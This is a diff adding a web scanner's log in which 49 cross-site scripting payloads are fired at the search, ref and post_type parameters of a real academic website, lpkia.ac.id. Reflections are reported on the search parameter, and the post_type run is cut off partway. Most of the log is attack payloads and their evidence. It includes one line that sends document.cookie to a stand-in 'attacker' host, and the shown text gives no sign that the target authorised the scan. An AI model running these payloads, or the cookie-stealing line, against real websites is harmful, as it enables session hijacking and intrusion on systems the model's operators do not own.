@@ -1,0 +1,463 @@
+=== Web Security Scan Report ===
+Target: http://lpkia.ac.id
+Start Time: Fri Oct 17 23:59:58 2025
+
+[~] Starting scan on target: http://lpkia.ac.id
+[~] Collected parameters from crawl: gdlr-core-privacy-settings, post_type, ref, s
+[~] Found parameters: s, ref, post_type, gdlr-core-privacy-settings
+[~] Phase: XSS (testing 49 payloads across 4 parameters)
+[XSS] (1/49) Testing payload on s: </title><svg/onload=confirm(1)>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3C%2Ftitle%3E%3Csvg%2Fonload%3Dconfirm%281%29%3E","name":"Hasil untuk &lt;/title&gt;&lt;svg/onload=confirm(1
+[XSS] (2/49) Testing payload on s: <script>confirm(1)</script>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E","name":"Hasil untuk &lt;script&gt;confirm(1)&lt;/script&gt
+[XSS] (3/49) Testing payload on s: "/><img src=x onerror=alert(1)>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%22%2F%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E","name":"Hasil untuk &quot;/&gt;&lt;img src=x onerror=alert
+[XSS] (4/49) Testing payload on s: <svg><script>alert(1)</script>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E","name":"Hasil untuk &lt;svg&gt;&lt;script&gt;alert(1)&lt;/
+[XSS] (5/49) Testing payload on s: <body onload=alert('xss')>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cbody+onload%3Dalert%28%27xss%27%29%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (6/49) Testing payload on s: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3C%2FtItLE%3E%3Ca%2F%2B%2FonPoINTEReNter%250a%3D%250aconfirm%28%29%250dx%2F%2Fv3dm0s","name":"Hasil untuk &lt;/tItLE&gt;&lt;a/+/onPoINTEReNter%0
+[XSS] (7/49) Testing payload on s: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3CA%25250donMOuseOvER%25250a%253D%25250aa%253Dprompt%252Ca%28%29%25250dx%252F%252Fv3dm0s%3Cimg+src%3D1+onerror%3Dconfirm%28%27xss%27%29%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (8/49) Testing payload on s: <iframe src="javascript:confirm(1)"></iframe>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Ciframe+src%3D%22javascript%3Aconfirm%281%29%22%3E%3C%2Fiframe%3E","name":"Hasil untuk &lt;iframe src=&quot;javascript:confir
+[XSS] (9/49) Testing payload on s: <svg onload=alert`1`>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Csvg+onload%3Dalert%601%60%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (10/49) Testing payload on s: '"><svg/onload=alert(1)>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%27%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E","name":"Hasil untuk &#039;&quot;&gt;&lt;svg/onload=alert(1
+[XSS] (11/49) Testing payload on s: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%22%3E%3Cscript%3Enew+Image%28%29.src%3D%27%2F%2Fattacker%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E","name":"Hasil untuk &quot;&gt;&lt;script&gt;new Image().sr
+[XSS] (12/49) Testing payload on s: <input autofocus onfocus=alert(1)>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+autofocus+onfocus%3Dalert%281%29%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (13/49) Testing payload on s: <details open ontoggle=alert(1)>Open</details>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cdetails+open+ontoggle%3Dalert%281%29%3EOpen%3C%2Fdetails%3E","name":"Hasil untuk &lt;details open ontoggle=alert(1)&gt;
+[XSS] (14/49) Testing payload on s: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Aalert%281%29%22%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (15/49) Testing payload on s: <object data="javascript:alert(1)"></object>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cobject+data%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E","name":"Hasil untuk &lt;object data=&quot;javascript:alert
+[XSS] (16/49) Testing payload on s: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Csvg%2Fonload%3D%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%281%29%3E","name":"Hasil untuk &lt;svg/onload=&#x61;&#x6C;&#x65;&#x72
+[XSS] (17/49) Testing payload on s: <img src=x onerror=javascript:confirm%281%29>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cimg+src%3Dx+onerror%3Djavascript%3Aconfirm%25281%2529%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (18/49) Testing payload on s: <img src="x" onerror="/*
+*/alert(1)">
+[XSS] (18) No reflection detected.
+[XSS] (19/49) Testing payload on s: <video><source onerror=alert(1)></video>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E","name":"Hasil untuk &lt;video&gt;&lt;source onerror=alert(
+[XSS] (20/49) Testing payload on s: <math><mi onmouseover=alert(1)>X</mi></math>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cmath%3E%3Cmi+onmouseover%3Dalert%281%29%3EX%3C%2Fmi%3E%3C%2Fmath%3E","name":"Hasil untuk &lt;math&gt;&lt;mi onmouseover=alert(1
+[XSS] (21/49) Testing payload on s: ' onmouseover=alert(1) x='
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%27+onmouseover%3Dalert%281%29+x%3D%27/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (22/49) Testing payload on s: "><svg><g onload=alert(1)></g></svg>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%22%3E%3Csvg%3E%3Cg+onload%3Dalert%281%29%3E%3C%2Fg%3E%3C%2Fsvg%3E","name":"Hasil untuk &quot;&gt;&lt;svg&gt;&lt;g onload=aler
+[XSS] (23/49) Testing payload on s: </textarea><script>alert('xss')</script>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E","name":"Hasil untuk &lt;/textarea&gt;&lt;script&gt;alert(&
+[XSS] (24/49) Testing payload on s: <a href="javascript:/*
+*/alert(1)">click</a>
+[XSS] (24) No reflection detected.
+[XSS] (25/49) Testing payload on s: <a href='javas&#99;ript:alert(1)'>x</a>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Ca+href%3D%27javas%26%2399%3Bript%3Aalert%281%29%27%3Ex%3C%2Fa%3E","name":"Hasil untuk &lt;a href=&#039;javas&#099;ript:alert
+[XSS] (26/49) Testing payload on s: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Csvg%3E%3CforeignObject%3E%3Cbody+onload%3Dconfirm%281%29%3E%3C%2Fbody%3E%3C%2FforeignObject%3E%3C%2Fsvg%3E","name":"Hasil untuk &lt;svg&gt;&lt;foreignObject&gt;&lt;bo
+[XSS] (27/49) Testing payload on s: <form action=javascript:alert(1)><input type=submit></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform+action%3Djavascript%3Aalert%281%29%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form action=javascript:alert(1)&gt
+[XSS] (28/49) Testing payload on s: <img src=x onerror=eval('con'+'firm(1)')>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cimg+src%3Dx+onerror%3Deval%28%27con%27%2B%27firm%281%29%27%29%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (29/49) Testing payload on s: <script>setTimeout(()=>alert(1),0)</script>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cscript%3EsetTimeout%28%28%29%3D%3Ealert%281%29%2C0%29%3C%2Fscript%3E","name":"Hasil untuk &lt;script&gt;setTimeout(()=&gt;alert(
+[XSS] (30/49) Testing payload on s: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[++] XSS reflection detected on s
+    Evidence: nk Math - https://rankmath.com/ --> <title>You Searched For %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e - INSTITUT DIGITAL EKONOMI</title> <meta name="robots" cont
+[XSS] (31/49) Testing payload on s: <input type="text" value="<script>alert('XSS')</script>">
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cinput+type%3D%22text%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E","name":"Hasil untuk &lt;input type=&quot;text&quot; value=
+[XSS] (32/49) Testing payload on s: <textarea><script>alert('XSS')</script></textarea>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Ctextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%2Ftextarea%3E","name":"Hasil untuk &lt;textarea&gt;&lt;script&gt;alert(&#
+[XSS] (33/49) Testing payload on s: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick+me%3C%2Fbutton%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form&gt;&lt;button formaction=&quo
+[XSS] (34/49) Testing payload on s: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cinput+type%3D%22hidden%22+name%3D%22xss%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form&gt;&lt;input type=&quot;hidde
+[XSS] (35/49) Testing payload on s: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22text%22+onfocus%3D%22alert%28%27XSS%27%29%22+value%3D%22Focus+me%22%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (36/49) Testing payload on s: <input type="button" value="Click me" onclick="alert('XSS')">
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22button%22+value%3D%22Click+me%22+onclick%3D%22alert%28%27XSS%27%29%22%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (37/49) Testing payload on s: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform+action%3D%22https%3A%2F%2Fexample.com%2Fpost%22+method%3D%22POST%22%3E%3Cinput+type%3D%22text%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form action=&quot;https://exampl
+[XSS] (38/49) Testing payload on s: <input type="text" value='"><script>alert(1)</script>'>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cinput+type%3D%22text%22+value%3D%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%3E","name":"Hasil untuk &lt;input type=&quot;text&quot; value=
+[XSS] (39/49) Testing payload on s: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22text%22+value%3D%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (40/49) Testing payload on s: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cinput+name%3D%22xss%22+value%3D%22%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E%22%3E%3C%2Fform%3E%3Cinput+type%3D%22text%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E","name":"Hasil untuk &lt;form&gt;&
+[XSS] (41/49) Testing payload on s: <textarea><script>alert('XSS')</script></textarea>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Ctextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%2Ftextarea%3E","name":"Hasil untuk &lt;textarea&gt;&lt;script&gt;alert(&#
+[XSS] (42/49) Testing payload on s: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick+me%3C%2Fbutton%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form&gt;&lt;button formaction=&quo
+[XSS] (43/49) Testing payload on s: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cinput+type%3D%22hidden%22+name%3D%22xss%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form&gt;&lt;input type=&quot;hidde
+[XSS] (44/49) Testing payload on s: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22text%22+onfocus%3D%22alert%28%27XSS%27%29%22+value%3D%22Focus+me%22%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (45/49) Testing payload on s: <input type="button" value="Click me" onclick="alert('XSS')">
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22button%22+value%3D%22Click+me%22+onclick%3D%22alert%28%27XSS%27%29%22%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (46/49) Testing payload on s: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform+action%3D%22https%3A%2F%2Fexample.com%2Fpost%22+method%3D%22POST%22%3E%3Cinput+type%3D%22text%22+value%3D%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form action=&quot;https://exampl
+[XSS] (47/49) Testing payload on s: <input type="text" value='"><script>alert(1)</script>'>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cinput+type%3D%22text%22+value%3D%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%3E","name":"Hasil untuk &lt;input type=&quot;text&quot; value=
+[XSS] (48/49) Testing payload on s: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[++] XSS reflection detected on s
+    Evidence: <meta property="og:url" content="https://lpkia.ac.id/search/%3Cinput+type%3D%22text%22+value%3D%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%3E/" /> <meta property="og:site_name" content="INSTITUT DIGITA
+[XSS] (49/49) Testing payload on s: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[++] XSS reflection detected on s
+    Evidence: da"}},{"@type":"ListItem","position":"2","item":{"@id":"/?s=%3Cform%3E%3Cinput+name%3D%22xss%22+value%3D%22%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E%22%3E%3C%2Fform%3E","name":"Hasil untuk &lt;form&gt;&lt;input name=&quot;xss&q
+[XSS] (1/49) Testing payload on ref: </title><svg/onload=confirm(1)>
+[XSS] (1) No reflection detected.
+[XSS] (2/49) Testing payload on ref: <script>confirm(1)</script>
+[XSS] (2) No reflection detected.
+[XSS] (3/49) Testing payload on ref: "/><img src=x onerror=alert(1)>
+[XSS] (3) No reflection detected.
+[XSS] (4/49) Testing payload on ref: <svg><script>alert(1)</script>
+[XSS] (4) No reflection detected.
+[XSS] (5/49) Testing payload on ref: <body onload=alert('xss')>
+[XSS] (5) No reflection detected.
+[XSS] (6/49) Testing payload on ref: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[XSS] (6) No reflection detected.
+[XSS] (7/49) Testing payload on ref: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[XSS] (7) No reflection detected.
+[XSS] (8/49) Testing payload on ref: <iframe src="javascript:confirm(1)"></iframe>
+[XSS] (8) No reflection detected.
+[XSS] (9/49) Testing payload on ref: <svg onload=alert`1`>
+[XSS] (9) No reflection detected.
+[XSS] (10/49) Testing payload on ref: '"><svg/onload=alert(1)>
+[XSS] (10) No reflection detected.
+[XSS] (11/49) Testing payload on ref: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[XSS] (11) No reflection detected.
+[XSS] (12/49) Testing payload on ref: <input autofocus onfocus=alert(1)>
+[XSS] (12) No reflection detected.
+[XSS] (13/49) Testing payload on ref: <details open ontoggle=alert(1)>Open</details>
+[XSS] (13) No reflection detected.
+[XSS] (14/49) Testing payload on ref: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[XSS] (14) No reflection detected.
+[XSS] (15/49) Testing payload on ref: <object data="javascript:alert(1)"></object>
+[XSS] (15) No reflection detected.
+[XSS] (16/49) Testing payload on ref: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[XSS] (16) No reflection detected.
+[XSS] (17/49) Testing payload on ref: <img src=x onerror=javascript:confirm%281%29>
+[XSS] (17) No reflection detected.
+[XSS] (18/49) Testing payload on ref: <img src="x" onerror="/*
+*/alert(1)">
+[XSS] (18) No reflection detected.
+[XSS] (19/49) Testing payload on ref: <video><source onerror=alert(1)></video>
+[XSS] (19) No reflection detected.
+[XSS] (20/49) Testing payload on ref: <math><mi onmouseover=alert(1)>X</mi></math>
+[XSS] (20) No reflection detected.
+[XSS] (21/49) Testing payload on ref: ' onmouseover=alert(1) x='
+[XSS] (21) No reflection detected.
+[XSS] (22/49) Testing payload on ref: "><svg><g onload=alert(1)></g></svg>
+[XSS] (22) No reflection detected.
+[XSS] (23/49) Testing payload on ref: </textarea><script>alert('xss')</script>
+[XSS] (23) No reflection detected.
+[XSS] (24/49) Testing payload on ref: <a href="javascript:/*
+*/alert(1)">click</a>
+[XSS] (24) No reflection detected.
+[XSS] (25/49) Testing payload on ref: <a href='javas&#99;ript:alert(1)'>x</a>
+[XSS] (25) No reflection detected.
+[XSS] (26/49) Testing payload on ref: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[XSS] (26) No reflection detected.
+[XSS] (27/49) Testing payload on ref: <form action=javascript:alert(1)><input type=submit></form>
+[XSS] (27) No reflection detected.
+[XSS] (28/49) Testing payload on ref: <img src=x onerror=eval('con'+'firm(1)')>
+[XSS] (28) No reflection detected.
+[XSS] (29/49) Testing payload on ref: <script>setTimeout(()=>alert(1),0)</script>
+[XSS] (29) No reflection detected.
+[XSS] (30/49) Testing payload on ref: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[XSS] (30) No reflection detected.
+[XSS] (31/49) Testing payload on ref: <input type="text" value="<script>alert('XSS')</script>">
+[XSS] (31) No reflection detected.
+[XSS] (32/49) Testing payload on ref: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (32) No reflection detected.
+[XSS] (33/49) Testing payload on ref: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (33) No reflection detected.
+[XSS] (34/49) Testing payload on ref: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (34) No reflection detected.
+[XSS] (35/49) Testing payload on ref: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (35) No reflection detected.
+[XSS] (36/49) Testing payload on ref: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (36) No reflection detected.
+[XSS] (37/49) Testing payload on ref: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (37) No reflection detected.
+[XSS] (38/49) Testing payload on ref: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (38) No reflection detected.
+[XSS] (39/49) Testing payload on ref: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (39) No reflection detected.
+[XSS] (40/49) Testing payload on ref: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form><input type="text" value="<script>alert('XSS')</script>">
+[XSS] (40) No reflection detected.
+[XSS] (41/49) Testing payload on ref: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (41) No reflection detected.
+[XSS] (42/49) Testing payload on ref: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (42) No reflection detected.
+[XSS] (43/49) Testing payload on ref: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (43) No reflection detected.
+[XSS] (44/49) Testing payload on ref: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (44) No reflection detected.
+[XSS] (45/49) Testing payload on ref: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (45) No reflection detected.
+[XSS] (46/49) Testing payload on ref: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (46) No reflection detected.
+[XSS] (47/49) Testing payload on ref: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (47) No reflection detected.
+[XSS] (48/49) Testing payload on ref: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (48) No reflection detected.
+[XSS] (49/49) Testing payload on ref: <form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+[XSS] (49) No reflection detected.
+[XSS] (1/49) Testing payload on post_type: </title><svg/onload=confirm(1)>
+[XSS] (1) No reflection detected.
+[XSS] (2/49) Testing payload on post_type: <script>confirm(1)</script>
+[XSS] (2) No reflection detected.
+[XSS] (3/49) Testing payload on post_type: "/><img src=x onerror=alert(1)>
+[XSS] (3) No reflection detected.
+[XSS] (4/49) Testing payload on post_type: <svg><script>alert(1)</script>
+[XSS] (4) No reflection detected.
+[XSS] (5/49) Testing payload on post_type: <body onload=alert('xss')>
+[XSS] (5) No reflection detected.
+[XSS] (6/49) Testing payload on post_type: </tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s
+[XSS] (6) No reflection detected.
+[XSS] (7/49) Testing payload on post_type: <A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>
+[XSS] (7) No reflection detected.
+[XSS] (8/49) Testing payload on post_type: <iframe src="javascript:confirm(1)"></iframe>
+[XSS] (8) No reflection detected.
+[XSS] (9/49) Testing payload on post_type: <svg onload=alert`1`>
+[XSS] (9) No reflection detected.
+[XSS] (10/49) Testing payload on post_type: '"><svg/onload=alert(1)>
+[XSS] (10) No reflection detected.
+[XSS] (11/49) Testing payload on post_type: "><script>new Image().src='//attacker/?c='+document.cookie</script>
+[XSS] (11) No reflection detected.
+[XSS] (12/49) Testing payload on post_type: <input autofocus onfocus=alert(1)>
+[XSS] (12) No reflection detected.
+[XSS] (13/49) Testing payload on post_type: <details open ontoggle=alert(1)>Open</details>
+[XSS] (13) No reflection detected.
+[XSS] (14/49) Testing payload on post_type: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[XSS] (14) No reflection detected.
+[XSS] (15/49) Testing payload on post_type: <object data="javascript:alert(1)"></object>
+[XSS] (15) No reflection detected.
+[XSS] (16/49) Testing payload on post_type: <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+[XSS] (16) No reflection detected.
+[XSS] (17/49) Testing payload on post_type: <img src=x onerror=javascript:confirm%281%29>
+[XSS] (17) No reflection detected.
+[XSS] (18/49) Testing payload on post_type: <img src="x" onerror="/*
+*/alert(1)">
+[XSS] (18) No reflection detected.
+[XSS] (19/49) Testing payload on post_type: <video><source onerror=alert(1)></video>
+[XSS] (19) No reflection detected.
+[XSS] (20/49) Testing payload on post_type: <math><mi onmouseover=alert(1)>X</mi></math>
+[XSS] (20) No reflection detected.
+[XSS] (21/49) Testing payload on post_type: ' onmouseover=alert(1) x='
+[XSS] (21) No reflection detected.
+[XSS] (22/49) Testing payload on post_type: "><svg><g onload=alert(1)></g></svg>
+[XSS] (22) No reflection detected.
+[XSS] (23/49) Testing payload on post_type: </textarea><script>alert('xss')</script>
+[XSS] (23) No reflection detected.
+[XSS] (24/49) Testing payload on post_type: <a href="javascript:/*
+*/alert(1)">click</a>
+[XSS] (24) No reflection detected.
+[XSS] (25/49) Testing payload on post_type: <a href='javas&#99;ript:alert(1)'>x</a>
+[XSS] (25) No reflection detected.
+[XSS] (26/49) Testing payload on post_type: <svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>
+[XSS] (26) No reflection detected.
+[XSS] (27/49) Testing payload on post_type: <form action=javascript:alert(1)><input type=submit></form>
+[XSS] (27) No reflection detected.
+[XSS] (28/49) Testing payload on post_type: <img src=x onerror=eval('con'+'firm(1)')>
+[XSS] (28) No reflection detected.
+[XSS] (29/49) Testing payload on post_type: <script>setTimeout(()=>alert(1),0)</script>
+[XSS] (29) No reflection detected.
+[XSS] (30/49) Testing payload on post_type: %22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e
+[XSS] (30) No reflection detected.
+[XSS] (31/49) Testing payload on post_type: <input type="text" value="<script>alert('XSS')</script>">
+[XSS] (31) No reflection detected.
+[XSS] (32/49) Testing payload on post_type: <textarea><script>alert('XSS')</script></textarea>
+[XSS] (32) No reflection detected.
+[XSS] (33/49) Testing payload on post_type: <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+[XSS] (33) No reflection detected.
+[XSS] (34/49) Testing payload on post_type: <form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+[XSS] (34) No reflection detected.
+[XSS] (35/49) Testing payload on post_type: <input type="text" onfocus="alert('XSS')" value="Focus me">
+[XSS] (35) No reflection detected.
+[XSS] (36/49) Testing payload on post_type: <input type="button" value="Click me" onclick="alert('XSS')">
+[XSS] (36) No reflection detected.
+[XSS] (37/49) Testing payload on post_type: <form action="https://example.com/post" method="POST"><input type="text" value="<script>alert('XSS')</script>"></form>
+[XSS] (37) No reflection detected.
+[XSS] (38/49) Testing payload on post_type: <input type="text" value='"><script>alert(1)</script>'>
+[XSS] (38) No reflection detected.
+[XSS] (39/49) Testing payload on post_type: <input type="text" value='"><img src=x onerror=alert(1)>'>
+[XSS] (39) No reflection detected.
